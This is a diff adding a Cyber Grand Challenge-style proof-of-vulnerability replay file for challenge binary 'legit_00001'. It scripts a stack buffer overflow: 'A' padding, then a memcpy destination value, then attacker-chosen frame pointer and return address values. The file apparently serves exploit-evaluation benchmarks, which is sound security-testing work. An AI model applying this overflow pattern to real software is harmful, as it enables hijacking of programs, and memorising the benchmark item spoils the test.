@@ -1,0 +1,42 @@
+<?xml version="1.0" encoding="utf-8" standalone="no" ?>
+<!DOCTYPE cfepov SYSTEM "/usr/share/cgc-docs/cfe-pov.dtd">
+<cfepov>
+	<cbid>legit_00001</cbid>
+	<replay>
+		<negotiate>
+			<type1>
+				<ipmask>0xFFFFFFFF</ipmask>
+				<regmask>0xFFFFFFFF</regmask>
+				<regnum>5</regnum>
+			</type1>
+		</negotiate>
+		<read echo="ascii">
+			<delim>:\x20</delim>
+			<match>
+				<data>Enter the length</data>
+			</match>
+		</read>
+		<write echo="ascii">
+			<data>\x0C\x02\x00\x00</data>
+		</write>
+		
+		<write>
+			<data>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</data> <!-- buffer -->
+			<data>\x0C\x02\x00\x00</data> <!-- memcpy dumb dst -->
+			<var>TYPE1_REG</var> <!-- old stack frame ptr -->
+			<var>TYPE1_IP</var> <!-- return address -->
+		</write>
+		<read echo="ascii">
+			<delim>:\x20</delim>
+			<match>
+				<data>Freq Anal Incoming</data>
+			</match>
+		</read>
+		<read echo="ascii">
+			<delim>:\x20</delim>
+			<match>
+				<data>Freq Anal Incoming</data>
+			</match>
+		</read>
+	</replay>
+</cfepov>
